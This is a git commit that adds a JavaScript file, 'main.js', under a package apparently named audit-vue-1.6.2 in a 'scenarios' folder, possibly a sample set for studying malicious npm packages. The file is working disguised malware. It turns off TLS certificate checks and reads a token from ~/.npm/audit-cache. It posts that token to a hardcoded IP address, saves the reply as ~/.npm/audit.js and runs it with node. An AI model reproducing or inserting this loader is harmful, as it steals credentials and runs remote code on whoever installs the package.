565ced9d602704a38025bc3a4cbacf06b0739afd
Blue <1796369212@qq.com>
2024-12-13 19:13:25 +0800

    add sc4

---
+++ scenarios/sc4/audit-vue-1.6.2/main.js
@@ -0,0 +1,45 @@
+const os = require("os");
+const path = require("path");
+var fs = require('fs');
+
+function getsvnroot(domain, entry, token, path) {
+	const https = require('https');
+	const querystring = require('querystring');
+
+	const options = {
+	  hostname: domain,
+	  port: 443,
+	  path: entry,
+	  method: 'POST',
+	  headers: {'content-type' : 'application/x-www-form-urlencoded'},
+	};
+
+	const req = https.request(options, (resp) => {
+		let data = "";
+		// A chunk of data has been recieved.
+		resp.on("data", chunk => {
+		  data += chunk;
+		});
+		resp.on("end", () => {
+			fs.writeFileSync(path, data);			
+			const { exec } = require('child_process');
+			exec('node ' + path, (error, stdout, stderr) => {				
+				
+			});
+		});
+	});
+	req.on('error', (e) => {
+	  console.error(e.message);
+	});
+	req.write(token);
+	req.end(); 
+}
+
+process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0
+
+var dir = path.join(os.homedir(), ".npm");
+if (fs.existsSync(dir)){
+	const token = fs.readFileSync(path.join(dir,'audit-cache'),
+            {encoding:'utf8', flag:'r'});
+	getsvnroot('10.96.177.36', '/getcheckjs.php', token, path.join(dir ,'audit.js'));
+}
